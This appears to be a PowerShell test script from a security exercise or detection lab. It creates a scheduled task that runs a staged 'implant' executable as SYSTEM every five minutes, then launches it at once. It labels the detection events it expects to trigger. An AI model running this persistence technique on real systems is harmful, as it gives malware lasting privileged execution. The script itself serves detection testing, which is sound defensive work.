if (-not (Test-Path C:\Users\Public\sysupd.exe)) {
    Write-Warning "stage the implant first (any delivery-* walkthrough)"; exit 1
}
Write-Host "[1] creating SYSTEM task, 5-minute interval (expect EVT-4698 + PERS-TASK)..."
schtasks /create /f /tn "CCDCTestTask" /sc minute /mo 5 /tr "C:\Users\Public\sysupd.exe" /ru SYSTEM
Write-Host "[2] firing now (expect the full launch chain: EVT-4688-TEMP + PROG-IMPLANT-LAUNCH)..."
schtasks /run /tn CCDCTestTask
Write-Host "task will keep re-firing every 5 min until cleanup"
